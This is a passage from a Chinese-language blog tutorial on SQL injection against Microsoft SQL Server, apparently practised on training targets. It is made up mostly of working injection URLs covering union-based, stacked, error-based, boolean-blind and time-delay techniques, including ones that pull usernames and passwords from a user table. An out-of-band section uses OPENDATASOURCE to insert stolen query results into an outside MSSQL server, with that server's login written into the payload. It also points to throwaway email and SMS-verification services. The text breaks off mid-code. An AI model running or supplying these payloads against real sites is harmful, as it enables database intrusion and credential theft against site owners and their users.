class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">对象类型：</span><br><span class=\"line\">AF = 聚合函数 (CLR)</span><br><span class=\"line\">C = CHECK 约束</span><br><span class=\"line\">D = <span class=\"keyword\">DEFAULT</span>（约束或独立）</span><br><span class=\"line\">F = FOREIGN KEY 约束</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">FN</span> = <span class=\"title\">SQL</span> 标量函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">FS</span> = 程序集 (<span class=\"params\">CLR</span>) 标量函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">FT</span> = 程序集 (<span class=\"params\">CLR</span>) 表值函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">IF</span> = <span class=\"title\">SQL</span> 内联表值函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">IT</span> = 内部表</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">P</span> = <span class=\"title\">SQL</span> 存储过程</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">PC</span> = 程序集 (<span class=\"params\">CLR</span>) 存储过程</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">PG</span> = 计划指南</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">PK</span> = <span class=\"title\">PRIMARY</span> <span class=\"title\">KEY</span> 约束</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">R</span> = 规则（旧式，独立）</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">RF</span> = 复制筛选过程</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">S</span> = 系统基表</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">SN</span> = 同义词</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">SQ</span> = 服务队列</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">TA</span> = 程序集 (<span class=\"params\">CLR</span>) <span class=\"title\">DML</span> 触发器</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">TF</span> = <span class=\"title\">SQL</span> 表值函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">TR</span> = <span class=\"title\">SQL</span> <span class=\"title\">DML</span> 触发器</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">U</span> = 表（用户定义类型）</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">UQ</span> = <span class=\"title\">UNIQUE</span> 约束</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">V</span> = 视图</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">X</span> = 扩展存储过程</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"排序-amp-获取下一条数据\"><a href=\"#排序-amp-获取下一条数据\" class=\"headerlink\" title=\"排序&amp;获取下一条数据\"></a>排序&amp;获取下一条数据</h3><p>mssql数据库中没有limit排序获取字段，但是可以使用top 1来显示数据中的第一条数据，后面与Oracle数据库注入一样，使用&lt;&gt;或not in 来排除已经显示的数据，获取下一条数据。但是与Oracle数据库不同的是使用not in的时候后面需要带上(‘’)，类似数组，也就是不需要输入多个not in来获取数据，这可以很大程序减少输入的数据量，如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#使用&lt;&gt;获取数据</span></span><br><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id=&#x27;5575058&#x27; and name&lt;&gt;&#x27;id&#x27; and name&lt;&gt;&#x27;username&#x27;-- qwe</span></span><br><span class=\"line\"><span class=\"comment\">#使用not in获取数据</span></span><br><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id=&#x27;5575058&#x27; and name not in (&#x27;id&#x27;,&#x27;username&#x27;)-- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p2.ssl.qhimg.com/t015afc1e1d3880b015.png\"></p>\n<h3 id=\"堆叠注入\"><a href=\"#堆叠注入\" class=\"headerlink\" title=\"堆叠注入\"></a>堆叠注入</h3><p>在SQL中，执行语句是通过;分割的，如果我们输入的;被数据库带入执行，那么就可以在其后加入sql执行语句，导致多条语句一起执行的注入，我们将其命名为堆叠注入。具体情况如下，很明显两条语句都进行了执行。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//192.168.150.4:9001/less-1.asp?id=1&#x27;;WAITFOR DELAY &#x27;0:0:5&#x27;;-- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p5.ssl.qhimg.com/t0181df866952842a55.png\"></p>\n<h1 id=\"0x03-显错注入\"><a href=\"#0x03-显错注入\" class=\"headerlink\" title=\"0x03 显错注入\"></a>0x03 显错注入</h1><h2 id=\"1、判断当前字段数\"><a href=\"#1、判断当前字段数\" class=\"headerlink\" title=\"1、判断当前字段数\"></a>1、判断当前字段数</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=2 order by 4</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p5.ssl.qhimg.com/t0163e343ea44015455.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=2 order by 5</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p4.ssl.qhimg.com/t015ef0881aee65eff3.png\"><br>通过order by报错情况，可以判断出当前字段为4。</p>\n<h2 id=\"2、联合查询，获取显错点\"><a href=\"#2、联合查询，获取显错点\" class=\"headerlink\" title=\"2、联合查询，获取显错点\"></a>2、联合查询，获取显错点</h2><p>1、首先因为不知道具体类型，所以还是先用null来填充字符</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select null,null,null,null -- qwe</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://p2.ssl.qhimg.com/t01c956d559eaff2a4a.png\"><br>2、替换null为’null’，获取显错点</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;null&#x27;,&#x27;null&#x27;,null -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p3.ssl.qhimg.com/t01661e89ccac5d5661.png\"><br>当第一个字符设置为字符串格式时，页面报错，很明显这个就是id了，为整型字符。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select &#x27;null&#x27;,&#x27;null&#x27;,&#x27;null&#x27;,null -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p5.ssl.qhimg.com/t0100837f900c3ef729.png\"></p>\n<h2 id=\"3、通过显错点获取数据库信息\"><a href=\"#3、通过显错点获取数据库信息\" class=\"headerlink\" title=\"3、通过显错点获取数据库信息\"></a>3、通过显错点获取数据库信息</h2><p>1、获取数据库版本</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select @@version),null -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p4.ssl.qhimg.com/t012f189779bf95f529.png\"><br>2、查询当前数据库名称<br>通过轮询db_name(<em>)里</em>的内容，获取所有数据库库名</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name()),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name(1)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name(2)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name(3)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name(4)),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select db_name(5)),null -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p5.ssl.qhimg.com/t01b48e6d8d29baefaa.png\"><br><img src=\"https://p4.ssl.qhimg.com/t01409617b57bcdb809.png\"><br>3、查询当前用户</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select user),null -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p3.ssl.qhimg.com/t01e868a65736530e91.png\"></p>\n<h2 id=\"4、查询表名\"><a href=\"#4、查询表名\" class=\"headerlink\" title=\"4、查询表名\"></a>4、查询表名</h2><p>查询dbo.sysobjects表中用户创建的表，获取其对应的id和name</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select null,id,name,null from dbo.sysobjects where xtype=&#x27;U&#x27; -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p4.ssl.qhimg.com/t0125721234db891a35.png\"><br>查询下一个表名</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#使用&lt;&gt;获取下一条数据http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.sysobjects where xtype=&#x27;U&#x27; and id &lt;&gt; 5575058 -- qwe#使用not in获取下一条数据http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.sysobjects where xtype=&#x27;U&#x27; and id not in (&#x27;5575058&#x27;) -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p4.ssl.qhimg.com/t011661598555b1c380.png\"></p>\n<h2 id=\"5、查询列名\"><a href=\"#5、查询列名\" class=\"headerlink\" title=\"5、查询列名\"></a>5、查询列名</h2><p>这里有个坑，查询列名的时候因为已经知道了表名的id值，所以where只需要使用id即可，不再需要xtype了。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id=&#x27;5575058&#x27;-- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p2.ssl.qhimg.com/t01c91e959dfc120a52.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,id,name,null from dbo.syscolumns where id=&#x27;5575058&#x27; and name not in (&#x27;id&#x27;,&#x27;username&#x27;)-- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p0.ssl.qhimg.com/t01a8944599c209006a.png\"></p>\n<h2 id=\"6、information-schema\"><a href=\"#6、information-schema\" class=\"headerlink\" title=\"6、information_schema\"></a>6、information_schema</h2><p>值得一提的是，除了借助sysobjects表和syscolumns表获取表名、列名外，mssql数据库中也兼容information_schema，里面存放了数据表表名和字段名，但是查询的数据好像存在一些问题，只查询到了manager表。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select top 1 table_name from information_schema.tables where table_name &lt;&gt; &#x27;manager&#x27;),null -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p1.ssl.qhimg.com/t0137da5be343f70f2e.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select top 1 column_name from information_schema.columns where table_name = &#x27;manage&#x27; ),null -- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select null,&#x27;1&#x27;,(select top 1 column_name from information_schema.columns where table_name = &#x27;manage&#x27; and column_name not in (&#x27;id&#x27;,&#x27;username&#x27;)),null -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p3.ssl.qhimg.com/t01498aaac4f709b4ec.png\"><br><img src=\"https://p4.ssl.qhimg.com/t011d74ab2d9658c021.png\"></p>\n<h2 id=\"7、获取数据\"><a href=\"#7、获取数据\" class=\"headerlink\" title=\"7、获取数据\"></a>7、获取数据</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,username,password,null from manage-- qwehttp://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 null,username,password,null from manage where username &lt;&gt; &#x27;admin_mz&#x27;-- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p5.ssl.qhimg.com/t01188d69b4c3307b79.png\"><br>解密获取密码<br><img src=\"https://p2.ssl.qhimg.com/t016cb243729a0f493a.png\"></p>\n<h1 id=\"0x04-报错注入\"><a href=\"#0x04-报错注入\" class=\"headerlink\" title=\"0x04 报错注入\"></a>0x04 报错注入</h1><p>mssql数据库是强类型语言数据库，当类型不一致时将会报错，配合子查询即可实现报错注入。</p>\n<h2 id=\"1、直接报错\"><a href=\"#1、直接报错\" class=\"headerlink\" title=\"1、直接报错\"></a>1、直接报错</h2><p>等号两边数据类型不一致配合子查询获取数据。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#获取数据库库名?id=1&#x27; and 1=(select db_name()) -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p0.ssl.qhimg.com/t01f288e811fb1764c3.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#获取第一个表名?id=1&#x27; and 1=(select top 1 name from dbo.sysobjects) -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p1.ssl.qhimg.com/t01c2dcc7214ea0790b.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#将数据连接显示?id=1&#x27;  and 1=stuff((select db_name() for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)--+</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2、convert-函数\"><a href=\"#2、convert-函数\" class=\"headerlink\" title=\"2、convert()函数\"></a>2、convert()函数</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">convert(<span class=\"keyword\">int</span>,db_name())，将第二个参数的值转换成第一个参数的<span class=\"keyword\">int</span>类型。</span><br></pre></td></tr></table></figure>\n\n<p>具体用法如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#获取数据库库名?id=1&#x27; and 1=convert(int,(select db_name())) -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p5.ssl.qhimg.com/t0147c5729c269d0ac8.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#获取数据库版本?id=1&#x27; and 1=convert(int,(select @@version))) -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p3.ssl.qhimg.com/t0171dbf58ebfd7a276.png\"></p>\n<h2 id=\"3、cast-函数\"><a href=\"#3、cast-函数\" class=\"headerlink\" title=\"3、cast()函数\"></a>3、cast()函数</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CAST(expression <span class=\"keyword\">AS</span> data_type)，将<span class=\"keyword\">as</span>前的参数以<span class=\"keyword\">as</span>后指定了数据类型转换。</span><br></pre></td></tr></table></figure>\n\n<p>具体用法如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#查询当前数据库?id=1&#x27; and 1=(select cast(db_name() as int)) -- qe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p0.ssl.qhimg.com/t01df3bbcf46b69a91b.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#查询第一个数据表?id=1&#x27; and 1=(select top 1 cast(name as int) from dbo.sysobjects) -- qe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p0.ssl.qhimg.com/t0194b470a057b6bc45.png\"></p>\n<h2 id=\"4、数据组合输出\"><a href=\"#4、数据组合输出\" class=\"headerlink\" title=\"4、数据组合输出\"></a>4、数据组合输出</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#将数据表组合输出?id=1&#x27; and 1=stuff((select quotename(name) from dbo.sysobjects  for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p0.ssl.qhimg.com/t0126a37aad232cde94.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#查询users表中的用户名并组合输出?id=1&#x27;  and 1=stuff((select quotename(username) from users for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)--+</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p4.ssl.qhimg.com/t01c6b6db795cf3b7df.png\"></p>\n<h1 id=\"0x05-布尔盲注\"><a href=\"#0x05-布尔盲注\" class=\"headerlink\" title=\"0x05 布尔盲注\"></a>0x05 布尔盲注</h1><h2 id=\"1、查询数据库库名\"><a href=\"#1、查询数据库库名\" class=\"headerlink\" title=\"1、查询数据库库名\"></a>1、查询数据库库名</h2><p>1、查询数据库库名长度为11</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40768/new_list.asp?id=2 and len((select top 1 db_name()))=11</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p1.ssl.qhimg.com/t01d1a89cb7da54caa8.png\"><br>2、查询第一个字符的ascii码为109</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),1,1))=109http://219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),1,1))&gt;109</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p5.ssl.qhimg.com/t0116e04363840e9a62.png\"><br><img src=\"https://p3.ssl.qhimg.com/t015abf97111fa1b9af.png\"><br>3、查询第二个字符的ascii码为111</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40768/new_list.asp?id=2 and ascii(substring((select top 1 db_name()),2,1))=111</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p5.ssl.qhimg.com/t01e337930ebb104e75.png\"><br>4、获取所有ascii码之后，解码获取数据<br><img src=\"https://p1.ssl.qhimg.com/t011e5c21dc29f4e03b.png\"></p>\n<h2 id=\"2、查询表名\"><a href=\"#2、查询表名\" class=\"headerlink\" title=\"2、查询表名\"></a>2、查询表名</h2><p>除了像上面查询库名使用了ascii码外，还可以直接猜解字符串</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40768/new_list.asp?id=2 and substring((select top 1 name from dbo.sysobjects where xtype=&#x27;U&#x27;),1,1)=&#x27;m&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p1.ssl.qhimg.com/t019bb4ff316062345b.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//219.153.49.228:40768/new_list.asp?id=2 and substring((select top 1 name from dbo.sysobjects where xtype=&#x27;U&#x27;),1,6)=&#x27;manage&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p5.ssl.qhimg.com/t017026272920723c8d.png\"></p>\n<h1 id=\"0x06-延时盲注\"><a href=\"#0x06-延时盲注\" class=\"headerlink\" title=\"0x06 延时盲注\"></a>0x06 延时盲注</h1><h2 id=\"1、延时函数-WAITFOR-DELAY\"><a href=\"#1、延时函数-WAITFOR-DELAY\" class=\"headerlink\" title=\"1、延时函数 WAITFOR DELAY\"></a>1、延时函数 WAITFOR DELAY</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">语法：n表示延时几秒WAITFOR DELAY <span class=\"string\">&#x27;0:0:n&#x27;</span>id=<span class=\"number\">1</span> <span class=\"keyword\">if</span> (布尔盲注的判断语句) WAITFOR DELAY <span class=\"string\">&#x27;0:0:5&#x27;</span> -- qwe</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2、查询数据\"><a href=\"#2、查询数据\" class=\"headerlink\" title=\"2、查询数据\"></a>2、查询数据</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#判断如果第一个库的库名的第一个字符的ascii码为109，则延时5秒http://219.153.49.228:40768/new_list.asp?id=2 if (ascii(substring((select top 1 db_name()),1,1))=109) WAITFOR DELAY &#x27;0:0:5&#x27; -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p3.ssl.qhimg.com/t018900c2d899e6edae.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#判断如果第一个表的表名的第一个字符为m，则延时5秒http://219.153.49.228:40768/new_list.asp?id=2 if (substring((select top 1 name from dbo.sysobjects where xtype=&#x27;U&#x27;),1,1)=&#x27;m&#x27;) WAITFOR DELAY &#x27;0:0:5&#x27; -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p3.ssl.qhimg.com/t01b7f6779fd2f33d7e.png\"></p>\n<h1 id=\"0x07-反弹注入\"><a href=\"#0x07-反弹注入\" class=\"headerlink\" title=\"0x07 反弹注入\"></a>0x07 反弹注入</h1><p>就像在Mysql中可以通过dnslog外带，Oracle可以通过python搭建一个http服务器接收外带的数据一样，在MSSQL数据库中，我们同样有方法进行数据外带，那就是通过反弹注入外带数据。<br>反弹注入条件相对苛刻一些，需要一台搭建了mssql数据库的vps服务器，需要开启堆叠注入。<br>反弹注入需要使用opendatasource函数。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">OPENDATASOURCE(provider_name,init_string):使用opendatasource函数将当前数据库查询的结果发送到另一数据库服务器中。</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">申请免费云服务器：香港云：http:<span class=\"comment\">//www.webweb.com/在线邮箱：http://24mail.chacuo.net/接码平台：https://yunduanxin.net/</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"1、环境准备\"><a href=\"#1、环境准备\" class=\"headerlink\" title=\"1、环境准备\"></a>1、环境准备</h2><p>1、首先打开靶场<br><img src=\"https://p3.ssl.qhimg.com/t0125c9c6371197c223.png\"><br>3、连接vps的mssql数据库，新建表test，字段数与类型要与要查询的数据相同。这里因为我想查询的是数据库库名，所以新建一个表里面只有一个字段，类型为varchar。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CREATE TABLE test(name VARCHAR(<span class=\"number\">255</span>))</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p0.ssl.qhimg.com/t01202219ab5bf4ddfc.png\"></p>\n<h2 id=\"2、获取数据库所有表\"><a href=\"#2、获取数据库所有表\" class=\"headerlink\" title=\"2、获取数据库所有表\"></a>2、获取数据库所有表</h2><p>1、使用反弹注入将数据注入到表中，注意这里填写的是数据库对应的参数，最后通过空格隔开要查询的数据。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#查询sysobjects表?id=1&#x27;;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test&#x27;).DB_14DC18D_test.dbo.test select name from dbo.sysobjects where xtype=&#x27;U&#x27; -- qwe#查询information_schema数据库?id=1&#x27;;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test&#x27;).DB_14DC18D_test.dbo.test select table_name from information_schema.tables -- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p>2、执行成功页面返回正常。<br><img src=\"https://p5.ssl.qhimg.com/t01dbe22abee44923d4.png\"><br>3、在数据库中成功获取到数据。<br><img src=\"https://p2.ssl.qhimg.com/t014a5c058780e87669.png\"></p>\n<h2 id=\"3、获取数据库admin表中的所有列名\"><a href=\"#3、获取数据库admin表中的所有列名\" class=\"headerlink\" title=\"3、获取数据库admin表中的所有列名\"></a>3、获取数据库admin表中的所有列名</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#查询information_schema数据库?id=1&#x27;;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test&#x27;).DB_14DC18D_test.dbo.test select column_name from information_schema.columns where table_name=&#x27;admin&#x27;-- qwe#查询syscolumns表?id=1&#x27;;insert into opendatasource(&#x27;sqloledb&#x27;,&#x27;server=SQL5095.site4now.net,1433;uid=DB_14DC18D_test_admin;pwd=123456;database=DB_14DC18D_test&#x27;).DB_14DC18D_test.dbo.test select name from dbo.syscolumns where id=1977058079-- qwe</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://p0.ssl.qhimg.com/t018c0e415a5ac7d536.png\"><br><img src=\"https://p1.ssl.qhimg.com/t01957478eb17de4d8a.png\"></p>\n<h2 id=\"4、获取数据\"><a href=\"#4、获取数据\" class=\"headerlink\" title=\"4、获取数据\"></a>4、获取数据</h2><p>1、首先新建一个表，里面放三个字段，分别是id，username和passwd。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CREATE 